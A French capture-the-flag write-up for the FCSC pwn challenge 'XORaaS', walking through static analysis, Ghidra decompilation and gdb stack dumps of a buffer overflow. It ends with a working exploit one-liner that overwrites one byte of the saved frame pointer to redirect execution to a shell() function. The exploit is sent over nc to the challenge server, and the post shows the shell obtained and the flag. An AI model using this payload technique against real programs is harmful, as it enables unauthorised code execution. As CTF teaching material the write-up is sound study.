### PWN / XORaaS


<p align="center">
  <img src="img/consignes.png" />
</p>


### Analyse

#### 1 -Statique


```bash
file xoraas
xoraas: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7cc01138056a55dbf7dd1f86e2b5fae1e72d8747, for GNU/Linux 3.2.0, not stripped

checksec --file xoraas
[*] 'C:\\Users\\Administrateur\\Downloads\\fcsc\\xoraas'
   Arch:     amd64-64-little
   RELRO:    Full RELRO
   Stack:    No canary found
   NX:       NX enabled
   PIE:      No PIE (0x400000)
```

Tout d'abord on note les sécurités activées :
(Pour plus d'informations : https://connect.ed-diamond.com/MISC/misc-062/la-securite-applicative-sous-linux)
- NX : la stack est non exécutable (pas de shellcode ...)
- RELRO : on va pas pouvoir écrire partout

En revanche pas de canary :)
Reste à supposer que l'ASLR est activée sur le serveur.


```bash
strings xoraas
/lib64/ld-linux-x86-64.so.2
stdin
stdout
execve
fwrite
fread
__libc_start_main
libc.so.6
GLIBC_2.2.5
__gmon_start__
[]A\A]A^A_
/bin/bash
;*3$"
GCC: (Debian 10.2.1-6) 10.2.1 20210110
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
xoraas.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
stdout@GLIBC_2.2.5
fread@GLIBC_2.2.5
stdin@GLIBC_2.2.5
_edata
__libc_start_main@GLIBC_2.2.5
execve@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
_dl_relocate_static_pie
__bss_start
main
fwrite@GLIBC_2.2.5
__TMC_END__
shell
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got
.data
.bss
.comment

```

Dans les strings on remarque des chaînes intéressantes : `execve` `/bin/bash` et ce qui pourrait être le nom d'une fonction : `shell`

```bash
readelf -S xoraas
There are 28 section headers, starting at offset 0x3980:

Section Headers:
 [Nr] Name              Type             Address           Offset
      Size              EntSize          Flags  Link  Info  Align
 [ 0]                   NULL             0000000000000000  00000000
      0000000000000000  0000000000000000           0     0     0
 [ 1] .interp           PROGBITS         00000000004002a8  000002a8
      000000000000001c  0000000000000000   A       0     0     1
 [ 2] .note.gnu.build-i NOTE             00000000004002c4  000002c4
      0000000000000024  0000000000000000   A       0     0     4
 [ 3] .note.ABI-tag     NOTE             00000000004002e8  000002e8
      0000000000000020  0000000000000000   A       0     0     4
 [ 4] .gnu.hash         GNU_HASH         0000000000400308  00000308
      0000000000000028  0000000000000000   A       5     0     8
 [ 5] .dynsym           DYNSYM           0000000000400330  00000330
      00000000000000c0  0000000000000018   A       6     1     8
 [ 6] .dynstr           STRTAB           00000000004003f0  000003f0
      0000000000000059  0000000000000000   A       0     0     1
 [ 7] .gnu.version      VERSYM           000000000040044a  0000044a
      0000000000000010  0000000000000002   A       5     0     2
 [ 8] .gnu.version_r    VERNEED          0000000000400460  00000460
      0000000000000020  0000000000000000   A       6     1     8
 [ 9] .rela.dyn         RELA             0000000000400480  00000480
      0000000000000060  0000000000000018   A       5     0     8
 [10] .rela.plt         RELA             00000000004004e0  000004e0
      0000000000000048  0000000000000018  AI       5    21     8
 [11] .init             PROGBITS         0000000000401000  00001000
      0000000000000017  0000000000000000  AX       0     0     4
 [12] .plt              PROGBITS         0000000000401020  00001020
      0000000000000040  0000000000000010  AX       0     0     16
 [13] .text             PROGBITS         0000000000401060  00001060
      0000000000000241  0000000000000000  AX       0     0     16
 [14] .fini             PROGBITS         00000000004012a4  000012a4
      0000000000000009  0000000000000000  AX       0     0     4
 [15] .rodata           PROGBITS         0000000000402000  00002000
      000000000000000e  0000000000000000   A       0     0     4
 [16] .eh_frame_hdr     PROGBITS         0000000000402010  00002010
      000000000000004c  0000000000000000   A       0     0     4
 [17] .eh_frame         PROGBITS         0000000000402060  00002060
      0000000000000140  0000000000000000   A       0     0     8
 [18] .init_array       INIT_ARRAY       0000000000403dc0  00002dc0
      0000000000000008  0000000000000008  WA       0     0     8
 [19] .fini_array       FINI_ARRAY       0000000000403dc8  00002dc8
      0000000000000008  0000000000000008  WA       0     0     8
 [20] .dynamic          DYNAMIC          0000000000403dd0  00002dd0
      00000000000001f0  0000000000000010  WA       6     0     8
 [21] .got              PROGBITS         0000000000403fc0  00002fc0
      0000000000000040  0000000000000008  WA       0     0     8
 [22] .data             PROGBITS         0000000000404000  00003000
      0000000000000010  0000000000000000  WA       0     0     8
 [23] .bss              NOBITS           0000000000404010  00003010
      0000000000000020  0000000000000000  WA       0     0     16
 [24] .comment          PROGBITS         0000000000000000  00003010
      0000000000000027  0000000000000001  MS       0     0     1
 [25] .symtab           SYMTAB           0000000000000000  00003038
      0000000000000630  0000000000000018          26    42     8
 [26] .strtab           STRTAB           0000000000000000  00003668
      000000000000021b  0000000000000000           0     0     1
 [27] .shstrtab         STRTAB           0000000000000000  00003883
      00000000000000fa  0000000000000000
```




#### 2 - Lancement du binaire

Le programme attend "beaucoup" de caractère en entrée, puis crash.

```bash
./xoraas
ttttttttttttttttttttttttttttt
ffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffff
fffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
[1]    69 segmentation fault  ./xoraas
```



#### 3 - Ghidra

On trouve assez vite dans Ghidra trois fonctions intéressantes : `main`, `xor` et `shell`.

```c
int main(void)

{
  char user_input [0x80];

  fread(user_input,1,0x80,stdin);
  xor(user_input);
  fwrite(user_input,1,0x80,stdout);
  return 0;
}

void xor(char *param_1)

{
  byte buff [0x8c];
  int i;

  fread(buff,1,0x91,stdin);
  for (i = 0; i < 0x80; i = i + 1) {
    param_1[i] = buff[i] ^ param_1[i];
  }
  return;
}



void shell(void)

{
  execve("/bin/bash",(char **)0x0,(char **)0x0);
  return;
}

```

Le programme attend `0x80` (128)  pour les stocker dans un tableau de taille 0x80, puis appelle xor, et nous affiche enfin à nouveau le contenu du buffer (modifié par xor).

En revanche, dans xor la vulnérabilité saute rapidement aux yeux, la fonction nous demande `0x91` (145) caractères pour les stocker dans un buffer de `0x8c` (140).

A première vue on va pourvoir déborder (un peu) du buffer `buff`.



#### 4 - Analyse dynamique

Maintenant que l'on connait un peu mieux les inputs attendus, on peut lancer une première fois le binaire en respectant les tailles attendues :

```bash
$ python3 -c "print('B' *128  + 'z' * 140, end='')" > toto.txt
$ ./xoraas < toto.txt
88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888
```

On a bien :

```
>>> chr(ord('B')^ord('z'))
'8'
```


On lance le programme dans gdb, en mettant un breakpoint sur `xorass`.

En regardant la stack juste après l'entrée dans `xor`, on retrouve notre buffer du `main` 128 * 'B '(0x424242....)

```bash
gdb-peda$ x/50gx $rsp
0x7fffffffde50: 0x00007ffff7dd38c0      0x0000000000000000
0x7fffffffde60: 0x0000000000000080      0x0000000000000d68
0x7fffffffde70: 0x00007fffffffdf00      0x00007ffff7aacacf
0x7fffffffde80: 0x0000000000000080      0x00007fffffffdea0
0x7fffffffde90: 0x00007ffff7b9b527      0x0000000000000080
0x7fffffffdea0: 0x00007ffff7dd38c0      0x0000000000000001
0x7fffffffdeb0: 0x0000000000000080      0x0000000000000000
0x7fffffffdec0: 0x0000000000000000      0x00007ffff7aa1ad9
0x7fffffffded0: 0x0000000000000000      0x0000000000000000
0x7fffffffdee0: 0x00007fffffffdf80      0x0000000000401060
0x7fffffffdef0: 0x00007fffffffdf80      0x0000000000401213
0x7fffffffdf00: 0x4242424242424242      0x4242424242424242
0x7fffffffdf10: 0x4242424242424242      0x4242424242424242
0x7fffffffdf20: 0x4242424242424242      0x4242424242424242
0x7fffffffdf30: 0x4242424242424242      0x4242424242424242
0x7fffffffdf40: 0x4242424242424242      0x4242424242424242
0x7fffffffdf50: 0x4242424242424242      0x4242424242424242
0x7fffffffdf60: 0x4242424242424242      0x4242424242424242
0x7fffffffdf70: 0x4242424242424242      0x4242424242424242
0x7fffffffdf80: 0x0000000000401240      0x00007ffff7a5a2e1
0x7fffffffdf90: 0x0000000000040000      0x00007fffffffe068
0x7fffffffdfa0: 0x00000001f7b9b508      0x00000000004011df
0x7fffffffdfb0: 0x0000000000000000      0x5981bbf8260aa856
0x7fffffffdfc0: 0x0000000000401060      0x00007fffffffe060
0x7fffffffdfd0: 0x0000000000000000      0x0000000000000000
```
Puis après le deuxième `fread` :

```gdb-peda$ x/50gx $rsp
0x7fffffffde50: 0x00007ffff7dd38c0      0x00007fffffffdf00
0x7fffffffde60: 0x7a7a7a7a7a7a7a7a      0x7a7a7a7a7a7a7a7a
0x7fffffffde70: 0x7a7a7a7a7a7a7a7a      0x7a7a7a7a7a7a7a7a
0x7fffffffde80: 0x7a7a7a7a7a7a7a7a      0x7a7a7a7a7a7a7a7a
0x7fffffffde90: 0x7a7a7a7a7a7a7a7a      0x7a7a7a7a7a7a7a7a
0x7fffffffdea0: 0x7a7a7a7a7a7a7a7a      0x7a7a7a7a7a7a7a7a
0x7fffffffdeb0: 0x7a7a7a7a7a7a7a7a      0x7a7a7a7a7a7a7a7a
0x7fffffffdec0: 0x7a7a7a7a7a7a7a7a      0x7a7a7a7a7a7a7a7a
0x7fffffffded0: 0x7a7a7a7a7a7a7a7a      0x7a7a7a7a7a7a7a7a
0x7fffffffdee0: 0x7a7a7a7a7a7a7a7a      0x000000007a7a7a7a
0x7fffffffdef0: 0x00007fffffffdf80      0x0000000000401213
0x7fffffffdf00: 0x4242424242424242      0x4242424242424242
0x7fffffffdf10: 0x4242424242424242      0x4242424242424242
0x7fffffffdf20: 0x4242424242424242      0x4242424242424242
0x7fffffffdf30: 0x4242424242424242      0x4242424242424242
0x7fffffffdf40: 0x4242424242424242      0x4242424242424242
0x7fffffffdf50: 0x4242424242424242      0x4242424242424242
0x7fffffffdf60: 0x4242424242424242      0x4242424242424242
0x7fffffffdf70: 0x4242424242424242      0x4242424242424242
0x7fffffffdf80: 0x0000000000401240      0x00007ffff7a5a2e1
0x7fffffffdf90: 0x0000000000040000      0x00007fffffffe068
0x7fffffffdfa0: 0x00000001f7b9b508      0x00000000004011df
0x7fffffffdfb0: 0x0000000000000000      0x5981bbf8260aa856
0x7fffffffdfc0: 0x0000000000401060      0x00007fffffffe060
0x7fffffffdfd0: 0x0000000000000000      0x0000000000000000
```

Les 140 * 'z' (0x7a7a7a....) ont aussi été posés sur la stack.

Après le buffer, on voit deux adresses :

0x00007fffffffdf80 -> (save $rbp) 0x0000000000401240
0x0000000000401213 -> adresse de retour de xor dans main

Dans l'idéal il faudrait écraser 0x0000000000401213 par l'adresse de la fonction `shell` pour avoir un shell :)

Mais on a que 145 caractères, donc 5 de plus que le buffer ....


En rajoutant 5 * 'A' à la fin de notre input :

```gdb-peda$ x/50gx $rsp
0x7fffffffde50: 0x00007ffff7dd38c0      0x00007fffffffdf00
0x7fffffffde60: 0x7a7a7a7a7a7a7a7a      0x7a7a7a7a7a7a7a7a
0x7fffffffde70: 0x7a7a7a7a7a7a7a7a      0x7a7a7a7a7a7a7a7a
0x7fffffffde80: 0x7a7a7a7a7a7a7a7a      0x7a7a7a7a7a7a7a7a
0x7fffffffde90: 0x7a7a7a7a7a7a7a7a      0x7a7a7a7a7a7a7a7a
0x7fffffffdea0: 0x7a7a7a7a7a7a7a7a      0x7a7a7a7a7a7a7a7a
0x7fffffffdeb0: 0x7a7a7a7a7a7a7a7a      0x7a7a7a7a7a7a7a7a
0x7fffffffdec0: 0x7a7a7a7a7a7a7a7a      0x7a7a7a7a7a7a7a7a
0x7fffffffded0: 0x7a7a7a7a7a7a7a7a      0x7a7a7a7a7a7a7a7a
0x7fffffffdee0: 0x7a7a7a7a7a7a7a7a      0x414141417a7a7a7a
0x7fffffffdef0: 0x00007fffffffdf41      0x0000000000401213
```

Effectivement, le 5e 'A' vient écraser le LSB du saved $rbp.
Si, on continue le flow d'exécution, nous retournons bien dans le `main`, puis le programme crash en quittant `main`.

En regardant les pointeurs : `RBP: 0x3838383838383838 ('88888888')`
Tiens, `0x00007fffffffdf41` pointe donc dans notre buffer :)
Si on écrase le LSB du saved RBP avec 0x00 on aura :  0x7fffffffdf00 -> 0x4242424242424242

### Exploitation

Dans le premier buffer on écrit l'adresse de `shell()`
Dans le deuxième des 0x00 pour que le xor ne change rien
Et pour écraser le LSB du saved RBP.


```#!/usr/bin/env bash
(python3 -c "print('\x42\x11\x40\x00\x00\x00\x00\x00' * 16 + '\x00' * 145)";cat ;) | nc challenges.france-cybersecurity-challenge.fr 2053
id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
ls
flag.txt
xoraas
cat flag.txt
FCSC{0d6c81576d1465a876422910769e79af287c9e73254112572737383039194f5d}

```
